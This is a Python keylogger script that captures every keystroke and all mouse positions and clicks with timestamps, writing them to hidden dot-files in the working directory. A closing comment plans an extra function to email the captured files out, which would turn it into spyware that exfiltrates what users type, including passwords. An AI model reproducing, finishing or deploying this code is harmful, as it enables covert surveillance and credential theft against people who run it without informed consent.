import keyboard
import pyautogui
import time
import threading
import datetime
import pynput

def recordKeys():
    while True:
        key = keyboard.read_key()
        event = keyboard.is_pressed(hotkey=key)
        if event:
            with open('.keys.txt', 'a') as file:
                clocktime = datetime.datetime.now().strftime("%r")
                file.write(f"'{key}'  At {clocktime}\n")
            


def mouseMonitor():
    size = pyautogui.size()
    with open('.mouse.txt', 'w') as file:
        file.write(f"Size: {size.width}x{size.height} \n")
    Xcopy, Ycopy = 0, 0
    
    while True:
        position = pyautogui.position()
        if position.x != Xcopy or position.y != Ycopy:
            with open('.mouse.txt', 'a') as file:
                clocktime = datetime.datetime.now().strftime("%r")
                file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
                Xcopy, Ycopy = position.x, position.y
                time.sleep(0.2)
    

def clickcheck(x, y, button, pressed, injected):
    if pressed:
        position = pyautogui.position()
        clocktime = datetime.datetime.now().strftime("%r")
        with open('.mouse.txt', 'a') as file:
            file.write(f"Click '{button}': {position.x}   Y:{position.y}  At {clocktime} \n")
    

if __name__ == "__main__":
    print("Hello user...")
    print("I want to record some keys from your keyboard")
    keyboardThread = threading.Thread(target=recordKeys)
    mouseThread = threading.Thread(target=mouseMonitor)

    keyboardThread.start()
    mouseThread.start()

    with pynput.mouse.Listener(on_click=clickcheck) as clickread:
        keyboardThread.join()
        mouseThread.join()
        clickread.join()



# almost everything is perfect

# just check the final working condition, and don't forgot to add the function which can send the files and error hadnling logs to your email